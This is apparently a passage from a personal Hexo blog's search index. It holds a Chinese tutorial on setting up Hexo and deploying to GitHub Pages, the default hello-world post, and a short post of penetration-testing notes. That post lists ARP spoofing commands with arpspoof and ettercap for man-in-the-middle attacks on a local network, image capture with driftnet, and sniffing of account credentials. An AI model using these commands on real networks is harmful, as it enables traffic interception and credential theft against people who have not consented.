hexo），回车等待安装完成。安装好了以后我们就可以进行初始化了。 5.接着我们进行初始化，接着输入命令（hexo init blog）回车以后等待完成之后你会发现多了一个blog文件夹，这个就是我们的项目文件。接着我们进入文件夹，输入命令（cd blog）进去以后我们执行(npm install)他会自动帮助我们安装好这个项目所有需要的模块。完成之后，我们可以输入（hexo server）此时如果没有报错我们可以看到我们的服务在本地开始运行了，我们可以打开浏览器输入（localhost:4000）回车后我们就能看helloworld界面了。至此我们已经小功告成了。我们在命令行中ctril+c就停止了服务。 6.我们的服务已经好了，接下来就是修改配置文件，让他变成我们自己的。观察整个目录结构，我们会发现一个_config.yml，这就是主要的配置信息，我们用合适的文本编辑器打开他，里面是一项项的配置信息，我们不用全部都看懂，我们只需要知道修改几个关键的地方就行了。首先在 #Site 项里面我们修改标题和作者。其他的我们暂时不用管。 7.我们如何写东西呢？我们所有的文章全部都在 Hexo\source_posts ，里面的.md后缀就是我们的文章，我们可以手动向里面添加我们写好的文件，也可以用命令（hexo new + 文章标题）来自动产生。所有的都弄好以后，我们希望所有的人都能访问到我们的博客，我们可以选择部署到服务器上，当然免费使用github是个不错的选择.Hexo也支持我们去往那里部署，并且命令简单。 8.我们需要去github上进行sign up，注册完成后我们可以建立我们自己的一个仓库，因为我们这个仓库是要放自己的博客的，所以仓库的名字要写成（username.github.io）创建好仓库后，我们就要告诉我们的项目，我要把你们部署到github上去了，还记得之前我们的那个配置文件_config.yml吗？在他的最下面有#Deployment这一项，在下面的type里写上git， 在repo项粘上我们的仓库链接就好了。下面我们就可以发布了，在你的git命令行里面打上（hexo clean &amp;&amp; hexo g &amp;&amp; hexo d）会提示你输入你的帐号的用户名和邮箱，然后就发布好了。这时在你的浏览器输入（username.github.io）你的博客就ok了。然后你就可以在本地写好你的文章然后重新部署一遍就好了。 9.Hexo上面也支持各种各样很酷的主题，如果你还想让他变得更酷一点，你就可以去找找主题，然后查查都是怎么用的。相信我，探索的乐趣是无穷的，而当你克服困难最终完成你的作品后那种满足感也是无与伦比的。 优秀的人，不是不合群，而是他们合群的人里面没有你]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透笔记]]></title>
    <url>%2F2018%2F03%2F30%2F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[看局域网ip: fping -asg 192.168.1.0 /24断网：arpspoof -i eth0(网卡) -t 目标ip 网关 . （欺骗 进行ip流量地址转发：echo 1&gt;/proc/sys/net/ipv4/ip_forward 或sysctl -w net.ipv4.ip_forward=1arpspoof -i eth0(网卡) -t 目标ip 网关 ettercap -i eth0 -Tp -M arp:remote/192.168.1.101//192.168.1.1//driftnet –i eth0 帐号获取：ettercap -Tq -i eth0 开启ssh： /etc/init.d/ssh start 优秀的人，不是不合群，而是他们合群的人里面没有你]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F03%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
